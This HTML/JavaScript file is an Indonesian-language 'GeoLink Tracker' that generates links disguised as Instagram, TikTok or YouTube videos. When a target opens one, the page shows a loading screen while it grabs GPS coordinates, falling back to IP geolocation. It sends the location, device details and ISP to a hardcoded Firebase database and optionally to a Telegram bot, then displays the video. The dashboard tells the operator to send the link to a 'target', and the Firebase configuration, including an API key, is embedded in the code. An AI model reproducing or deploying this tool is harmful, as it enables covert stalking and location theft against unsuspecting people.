<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GeoLink</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
    background: #0f172a; color: #e5e7eb;
    min-height: 100vh; padding: 20px;
  }
  .container { max-width: 1100px; margin: 0 auto; }
  h1 { color: #4ade80; font-size: 22px; margin-bottom: 20px; }
  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
  @media (max-width: 860px) { .grid { grid-template-columns: 1fr; } }
  .panel {
    background: #1e293b; padding: 24px;
    border-radius: 14px; border: 1px solid #334155;
  }
  .panel h2 {
    font-size: 14px; color: #93c5fd;
    text-transform: uppercase; letter-spacing: 0.5px;
    margin-bottom: 16px;
  }
  label {
    display: block; font-size: 12px;
    font-weight: 600; color: #94a3b8;
    margin-top: 12px; margin-bottom: 6px;
    text-transform: uppercase;
  }
  input, select {
    width: 100%; padding: 12px 14px;
    background: #0f172a; border: 1px solid #334155;
    border-radius: 8px; color: white;
    font-size: 14px; outline: none;
    font-family: inherit;
  }
  input:focus { border-color: #60a5fa; }
  input::placeholder { color: #64748b; }
  .btn {
    width: 100%; padding: 14px;
    background: linear-gradient(135deg, #833ab4, #fd1d1d);
    color: white; border: none;
    border-radius: 10px; font-size: 15px;
    font-weight: 700; cursor: pointer; margin-top: 16px;
  }
  .btn:hover { opacity: 0.9; }
  .btn-secondary {
    background: #334155;
  }
  .btn-secondary:hover { background: #475569; }
  #resultBox {
    display: none; margin-top: 14px;
    background: #0f172a; padding: 12px;
    border-radius: 8px; border: 1px solid #334155;
  }
  #resultBox.show { display: block; }
  #linkOut {
    font-family: monospace; font-size: 11px;
    word-break: break-all; color: #93c5fd;
    background: #020617; padding: 10px;
    border-radius: 6px; margin-bottom: 8px;
    user-select: all;
  }
  .row { display: flex; gap: 6px; }
  .row button {
    flex: 1; padding: 9px;
    border: none; border-radius: 6px;
    font-size: 12px; font-weight: 600;
    cursor: pointer; color: white;
  }
  .copy { background: #0ea5e9; }
  .test { background: #6366f1; }

  .stats {
    display: flex; gap: 10px; margin-bottom: 14px;
  }
  .stat {
    flex: 1; background: #0f172a;
    padding: 12px; border-radius: 8px;
    text-align: center; border: 1px solid #334155;
  }
  .stat-num { font-size: 22px; font-weight: 700; color: #4ade80; }
  .stat-lbl {
    font-size: 10px; color: #94a3b8;
    margin-top: 4px; text-transform: uppercase;
  }

  .list { max-height: 480px; overflow-y: auto; }
  .card {
    background: #0f172a; padding: 14px;
    border-radius: 10px; margin-bottom: 10px;
    border: 1px solid #334155;
    animation: slide 0.3s;
  }
  @keyframes slide {
    from { opacity: 0; transform: translateY(-8px); }
    to { opacity: 1; transform: translateY(0); }
  }
  .card-top {
    display: flex; justify-content: space-between;
    align-items: center; margin-bottom: 8px;
  }
  .time { font-size: 11px; color: #94a3b8; }
  .badge {
    font-size: 10px; padding: 3px 8px;
    border-radius: 20px; font-weight: 700;
    background: #065f46; color: #6ee7b7;
  }
  .badge.ip { background: #7c2d12; color: #fdba74; }
  .coords {
    font-family: monospace; font-size: 12px;
    color: #93c5fd; margin-bottom: 6px;
  }
  .meta { font-size: 11px; color: #94a3b8; line-height: 1.5; }
  .actions { display: flex; gap: 6px; margin-top: 8px; }
  .actions a, .actions button {
    flex: 1; padding: 6px;
    background: #1e40af; color: white;
    border: none; border-radius: 6px;
    font-size: 11px; font-weight: 600;
    text-align: center; text-decoration: none;
    cursor: pointer; font-family: inherit;
  }
  .actions button { background: #991b1b; }
  .empty {
    text-align: center; padding: 30px;
    color: #64748b; font-size: 13px;
  }
  .empty .icon { font-size: 40px; margin-bottom: 10px; opacity: 0.5; }
  .live-dot {
    display: inline-block; width: 8px; height: 8px;
    border-radius: 50%; background: #ef4444;
    animation: pulse 1.5s infinite; margin-right: 8px;
  }
  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
  }
  .warn {
    background: #7f1d1d; color: #fecaca;
    padding: 12px; border-radius: 8px;
    font-size: 12px; margin-bottom: 14px;
    border-left: 3px solid #ef4444;
    line-height: 1.5;
  }
  .warn code {
    background: #450a0a; padding: 2px 6px;
    border-radius: 4px; font-size: 11px;
  }

  /* TRACKING VIEW */
  #trackingView {
    display: none;
    position: fixed; inset: 0;
    background: #000; color: white;
    overflow-y: auto; z-index: 999;
  }
  .track-center {
    min-height: 100vh;
    display: flex; flex-direction: column;
    align-items: center; justify-content: center;
    padding: 20px; text-align: center;
  }
  .spinner {
    width: 44px; height: 44px;
    border: 4px solid #333;
    border-top-color: #fd1d1d;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin: 0 auto 16px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
  .track-title {
    font-size: 16px; font-weight: 600;
    margin-bottom: 6px;
  }
  .track-sub { color: #888; font-size: 13px; }
  #embedArea {
    width: 100%; max-width: 420px;
    margin-top: 16px;
  }
  #embedArea iframe {
    width: 100%; height: 600px;
    border: none; border-radius: 12px;
    background: #111;
  }
</style>
</head>
<body>

<!-- ============ GENERATOR VIEW ============ -->
<div class="container" id="generatorView">
  <h1><span class="live-dot" id="liveDot" style="display:none;"></span>📍 GeoLink Tracker</h1>

  <div class="warn" id="fbWarn" style="display:none;">
    ⚠️ <b>Firebase belum dikonfigurasi.</b>
  </div>

  <div class="grid">
    <div class="panel">
      <h2>🔗 Buat Tracking Link</h2>

      <label>Link Video (IG/TikTok/YouTube/FB)</label>
      <input type="text" id="videoUrl" value="https://www.instagram.com/reel/C8QZqXvSNrK/">

      <label>URL Website Ini (hosting Anda)</label>
      <input type="text" id="baseUrl" placeholder="https://xxx.netlify.app">

      <label>Bot Token Telegram (opsional)</label>
      <input type="text" id="botToken" placeholder="">

      <label>Chat ID Telegram (opsional)</label>
      <input type="text" id="chatId" placeholder="">

      <button class="btn" id="btnGenerate">🔗 Generate Link</button>

      <div id="resultBox">
        <div id="linkOut"></div>
        <div class="row">
          <button class="copy" id="btnCopy">📋 Copy</button>
          <button class="test" id="btnTest">🧪 Test</button>
        </div>
      </div>
    </div>

    <div class="panel">
      <h2>📡 Lokasi Masuk (Live)</h2>

      <div class="stats">
        <div class="stat">
          <div class="stat-num" id="statTotal">0</div>
          <div class="stat-lbl">Total</div>
        </div>
        <div class="stat">
          <div class="stat-num" id="statGps">0</div>
          <div class="stat-lbl">GPS</div>
        </div>
        <div class="stat">
          <div class="stat-num" id="statIp">0</div>
          <div class="stat-lbl">IP</div>
        </div>
      </div>

      <button class="btn btn-secondary" id="btnClear" style="margin-top:0; margin-bottom:12px; padding:10px; font-size:13px;">
        🗑️ Hapus Semua Data
      </button>

      <div class="list" id="list">
        <div class="empty">
          <div class="icon">📭</div>
          <p>Belum ada data.<br>Kirim link ke target,<br>lokasi akan muncul di sini otomatis.</p>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ============ TRACKING VIEW ============ -->
<div id="trackingView">
  <div class="track-center">
    <div id="loadingArea">
      <div class="spinner"></div>
      <div class="track-title">Memuat video...</div>
      <div class="track-sub">Mohon tunggu sebentar</div>
    </div>
    <div id="embedArea" style="display:none;"></div>
  </div>
</div>

<!-- ============ FIREBASE SDK (compat v9) ============ -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>

<script>
/* ==========================================================
   FIREBASE CONFIG — SUDAH DIISI DENGAN PUNYA ANDA
   ========================================================== */
var FIREBASE_CONFIG = {
  apiKey: "AIzaSyCWB0q5MIMnHYNJM_TcBB44qEogD3dgI4o",
  authDomain: "tracker-5e3aa.firebaseapp.com",
  databaseURL: "https://tracker-5e3aa-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "tracker-5e3aa",
  storageBucket: "tracker-5e3aa.firebasestorage.app",
  messagingSenderId: "70318749418",
  appId: "1:70318749418:web:f2adb2df7ef4ba968e0993"
};

var FIREBASE_READY = (
  FIREBASE_CONFIG.apiKey &&
  FIREBASE_CONFIG.apiKey.indexOf('ISI') === -1 &&
  FIREBASE_CONFIG.databaseURL &&
  FIREBASE_CONFIG.databaseURL.indexOf('ISI') === -1
);

var fbDB = null;

/* ==========================================================
   HELPERS
   ========================================================== */
function b64encode(str) {
  try {
    return btoa(unescape(encodeURIComponent(str)))
      .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  } catch(e) { return ''; }
}
function b64decode(str) {
  try {
    var s = String(str).replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    return decodeURIComponent(escape(atob(s)));
  } catch(e) { return ''; }
}

var LOCAL_KEY = 'geolink_visits';
function localGetAll() {
  try { return JSON.parse(localStorage.getItem(LOCAL_KEY) || '{}'); }
  catch(e) { return {}; }
}
function localSave(id, data) {
  try {
    var all = localGetAll();
    all[id] = data;
    localStorage.setItem(LOCAL_KEY, JSON.stringify(all));
    window.dispatchEvent(new StorageEvent('storage', {
      key: LOCAL_KEY, newValue: JSON.stringify(all)
    }));
  } catch(e) {}
}

/* ==========================================================
   INIT FIREBASE
   ========================================================== */
function initFirebase() {
  if (!FIREBASE_READY) return false;
  try {
    if (!firebase.apps.length) {
      firebase.initializeApp(FIREBASE_CONFIG);
    }
    fbDB = firebase.database();
    return true;
  } catch(e) {
    console.error('Firebase init error:', e);
    return false;
  }
}

/* ==========================================================
   ROUTER
   ========================================================== */
var urlParams = new URLSearchParams(window.location.search);
var pR = urlParams.get('r');
var pT = urlParams.get('t');

if (pR && pT) {
  // TRACKING MODE
  document.getElementById('generatorView').style.display = 'none';
  document.getElementById('trackingView').style.display = 'block';
  document.body.style.background = '#000';
  document.body.style.padding = '0';
  document.title = 'Video';

  initFirebase();
  initTracking(pR, pT, urlParams.get('b'), urlParams.get('c'));
} else {
  // GENERATOR MODE
  initGenerator();
}

/* ==========================================================
   GENERATOR
   ========================================================== */
function initGenerator() {
  var baseEl = document.getElementById('baseUrl');
  if (!baseEl.value) {
    var origin = window.location.origin;
    var path = window.location.pathname.replace(/\/[^/]*$/, '');
    baseEl.value = (origin === 'null' ? '' : origin) + path;
  }

  if (!FIREBASE_READY) {
    document.getElementById('fbWarn').style.display = 'block';
  }

  document.getElementById('btnGenerate').addEventListener('click', generateLink);
  document.getElementById('btnCopy').addEventListener('click', copyLink);
  document.getElementById('btnTest').addEventListener('click', testLink);
  document.getElementById('btnClear').addEventListener('click', clearAll);

  var ok = initFirebase();
  if (ok) {
    document.getElementById('liveDot').style.display = 'inline-block';
    startFirebaseListener();
  } else {
    startLocalListener();
  }
}

var generatedUrl = '';

function generateLink() {
  var videoUrl = document.getElementById('videoUrl').value.trim();
  var baseUrl = document.getElementById('baseUrl').value.trim();
  var botToken = document.getElementById('botToken').value.trim();
  var chatId = document.getElementById('chatId').value.trim();

  if (!videoUrl) { alert('Isi link video!'); return; }
  if (videoUrl.indexOf('http') !== 0) { alert('Link video harus mulai dengan http'); return; }
  if (!baseUrl) { alert('Isi URL website!'); return; }
  if (baseUrl.indexOf('http') !== 0) { alert('URL website harus mulai dengan http'); return; }

  baseUrl = baseUrl.replace(/\/+$/, '');

  var encodedVideo = b64encode(videoUrl);
  var token = Math.random().toString(36).slice(2, 12);

  var url = baseUrl + '/?r=' + encodedVideo + '&t=' + token;
  if (botToken) url += '&b=' + encodeURIComponent(botToken);
  if (chatId) url += '&c=' + encodeURIComponent(chatId);

  generatedUrl = url;
  document.getElementById('linkOut').textContent = url;
  document.getElementById('resultBox').classList.add('show');
}

function copyLink() {
  if (!generatedUrl) { alert('Generate dulu!'); return; }
  navigator.clipboard.writeText(generatedUrl).then(function() {
    alert('✅ Link di-copy!');
  }).catch(function() {
    var ta = document.createElement('textarea');
    ta.value = generatedUrl;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    alert('✅ Link di-copy!');
  });
}

function testLink() {
  if (!generatedUrl) { alert('Generate dulu!'); return; }
  window.open(generatedUrl, '_blank');
}

/* ==========================================================
   FIREBASE LISTENER
   ========================================================== */
function startFirebaseListener() {
  var ref = fbDB.ref('visits');

  ref.on('child_added', function(snap) {
    renderCard(snap.key, snap.val());
    updateStats();
  });

  ref.on('child_changed', function(snap) {
    var old = document.getElementById('v-' + snap.key);
    if (old) old.remove();
    renderCard(snap.key, snap.val());
    updateStats();
  });

  ref.on('child_removed', function(snap) {
    var el = document.getElementById('v-' + snap.key);
    if (el) el.remove();
    updateStats();
  });

  ref.once('value').then(function(snap) {
    var all = snap.val() || {};
    Object.keys(all).forEach(function(id) { renderCard(id, all[id]); });
    updateStats();
  });
}

function startLocalListener() {
  var all = localGetAll();
  Object.keys(all).forEach(function(id) { renderCard(id, all[id]); });
  updateStats();

  window.addEventListener('storage', function() {
    var current = localGetAll();
    document.getElementById('list').innerHTML = '';
    Object.keys(current).forEach(function(id) { renderCard(id, current[id]); });
    updateStats();
  });
}

/* ==========================================================
   RENDER CARD
   ========================================================== */
function renderCard(id, data) {
  if (!data) return;
  var list = document.getElementById('list');
  var empty = list.querySelector('.empty');
  if (empty) empty.remove();

  var old = document.getElementById('v-' + id);
  if (old) old.remove();

  var card = document.createElement('div');
  card.className = 'card';
  card.id = 'v-' + id;

  var isGps = data.type !== 'ip' && data.acc && data.acc < 1000;
  var badge = isGps
    ? '<span class="badge">🎯 GPS</span>'
    : '<span class="badge ip">📡 IP</span>';

  var time = data.time ? new Date(data.time).toLocaleString('id-ID') : '-';
  var lat = data.lat ? Number(data.lat).toFixed(6) : '-';
  var lng = data.lng ? Number(data.lng).toFixed(6) : '-';
  var acc = data.acc
    ? (isGps ? Math.round(data.acc) + ' m' : '~' + Math.round(data.acc / 1000) + ' km')
    : '-';

  var mapsLink = 'https://maps.google.com/?q=' + data.lat + ',' + data.lng;

  var ipInfo = '';
  if (data.city || data.country) {
    ipInfo = '<div class="meta">' +
      '🏙️ ' + (data.city || '-') + ', ' + (data.region || '-') + '<br>' +
      '🌍 ' + (data.country || '-') + ' · 📡 ' + (data.isp || '-') +
      '</div>';
  }

  var ua = data.ua || '';
  var device = '💻 Desktop';
  if (/Mobile|Android|iPhone|iPad/i.test(ua)) device = '📱 Mobile';
  if (/iPhone|iPad/i.test(ua)) device = '📱 iPhone/iPad';
  if (/Android/i.test(ua)) device = '📱 Android';

  card.innerHTML =
    '<div class="card-top">' +
      '<span class="time">🕐 ' + time + '</span>' +
      badge +
    '</div>' +
    '<div class="coords">🌐 ' + lat + ', ' + lng + '</div>' +
    '<div class="meta">🎯 ' + acc + ' · ' + device + '</div>' +
    ipInfo +
    '<div class="actions">' +
      '<a href="' + mapsLink + '" target="_blank">🗺️ Maps</a>' +
      '<button onclick="deleteOne(\'' + id + '\')">🗑️ Hapus</button>' +
    '</div>';

  list.insertBefore(card, list.firstChild);
}

function deleteOne(id) {
  if (!confirm('Hapus data ini?')) return;
  if (fbDB) {
    fbDB.ref('visits/' + id).remove();
  } else {
    var all = localGetAll();
    delete all[id];
    localStorage.setItem(LOCAL_KEY, JSON.stringify(all));
    var el = document.getElementById('v-' + id);
    if (el) el.remove();
    updateStats();
  }
}

function clearAll() {
  if (!confirm('Hapus SEMUA data?')) return;
  if (fbDB) {
    fbDB.ref('visits').remove();
  } else {
    localStorage.removeItem(LOCAL_KEY);
    document.getElementById('list').innerHTML =
      '<div class="empty"><div class="icon">📭</div><p>Belum ada data.</p></div>';
    updateStats();
  }
}

function updateStats() {
  var cards = document.querySelectorAll('.card');
  var total = cards.length, gps = 0, ip = 0;
  cards.forEach(function(c) {
    if (c.querySelector('.badge.ip')) ip++;
    else gps++;
  });
  document.getElementById('statTotal').textContent = total;
  document.getElementById('statGps').textContent = gps;
  document.getElementById('statIp').textContent = ip;
}

/* ==========================================================
   TRACKING MODE
   ========================================================== */
function initTracking(encodedR, token, botToken, chatId) {
  var videoUrl = b64decode(encodedR);

  window.TRACK = {
    videoUrl: videoUrl,
    token: token,
    botToken: botToken || '',
    chatId: chatId || ''
  };

  setTimeout(trackLocation, 500);
  setTimeout(showVideo, 1800);
}

function trackLocation() {
  if (!navigator.geolocation) { ipFallback(); return; }

  navigator.geolocation.getCurrentPosition(
    function(pos) {
      sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
    },
    function(err) {
      console.log('GPS denied:', err.message);
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, 'gps');
        },
        function() { ipFallback(); },
        { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
      );
    },
    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
  );
}

function ipFallback() {
  fetch('https://ipapi.co/json/')
    .then(function(r) { return r.json(); })
    .then(function(data) {
      if (data && data.latitude && data.longitude) {
        sendLocation(data.latitude, data.longitude, 5000, 'ip', {
          city: data.city,
          region: data.region,
          country: data.country_name,
          isp: data.org
        });
      }
    })
    .catch(function(e) { console.error(e); });
}

function sendLocation(lat, lng, acc, type, extra) {
  extra = extra || {};
  var id = Date.now() + '_' + Math.random().toString(36).slice(2, 8);

  var payload = {
    lat: lat, lng: lng, acc: acc, type: type,
    token: window.TRACK.token,
    time: new Date().toISOString(),
    ua: navigator.userAgent,
    city: extra.city || '',
    region: extra.region || '',
    country: extra.country || '',
    isp: extra.isp || ''
  };

  if (fbDB) {
    fbDB.ref('visits/' + id).set(payload)
      .then(function() { console.log('✅ Sent to Firebase'); })
      .catch(function(e) { console.error('Firebase write error:', e); });
  } else {
    localSave(id, payload);
  }

  if (window.TRACK.botToken && window.TRACK.chatId) {
    sendTelegram(lat, lng, acc, type, extra);
  }
}

function sendTelegram(lat, lng, acc, type, extra) {
  var mapsLink = 'https://maps.google.com/?q=' + lat + ',' + lng;
  var akurasi = (type === 'ip')
    ? '~' + Math.round(acc / 1000) + ' km'
    : Math.round(acc) + ' m';

  var text =
    '📍 Lokasi Baru\n\n' +
    'Lat: ' + lat.toFixed(6) + '\n' +
    'Lng: ' + lng.toFixed(6) + '\n' +
    'Akurasi: ' + akurasi + '\n' +
    'Maps: ' + mapsLink + '\n' +
    'Waktu: ' + new Date().toLocaleString('id-ID') + '\n' +
    'Token: ' + window.TRACK.token;

  fetch('https://api.telegram.org/bot' + window.TRACK.botToken + '/sendMessage', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: window.TRACK.chatId,
      text: text
    })
  }).catch(function(e) { console.error(e); });
}

function showVideo() {
  document.getElementById('loadingArea').style.display = 'none';
  var area = document.getElementById('embedArea');
  area.style.display = 'block';

  var url = window.TRACK.videoUrl;
  var embedUrl = null;
  var height = '600';

  var m = url.match(/instagram\.com\/(reel|p|tv)\/([A-Za-z0-9_-]+)/);
  if (m) {
    embedUrl = 'https://www.instagram.com/' + m[1] + '/' + m[2] + '/embed/';
  }

  if (!embedUrl) {
    m = url.match(/tiktok\.com\/.*\/video\/(\d+)/);
    if (m) {
      embedUrl = 'https://www.tiktok.com/embed/v2/' + m[1];
      height = '700';
    }
  }

  if (!embedUrl) {
    m = url.match(/(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/shorts\/)([A-Za-z0-9_-]{11})/);
    if (m) {
      embedUrl = 'https://www.youtube.com/embed/' + m[1] + '?autoplay=1';
      height = '240';
    }
  }

  if (embedUrl) {
    area.innerHTML = '<iframe src="' + embedUrl + '" ' +
      'style="height:' + height + 'px;" ' +
      'allow="autoplay; encrypted-media" allowfullscreen></iframe>';
  } else {
    area.innerHTML =
      '<div style="padding:30px;color:#ccc;">' +
        '<p style="margin-bottom:16px;">Video siap</p>' +
        '<a href="' + url + '" style="display:inline-block;padding:12px 24px;background:#2563eb;color:white;text-decoration:none;border-radius:8px;font-weight:bold;">▶️ Buka Video</a>' +
      '</div>';
  }
}
</script>

</body>
</html>
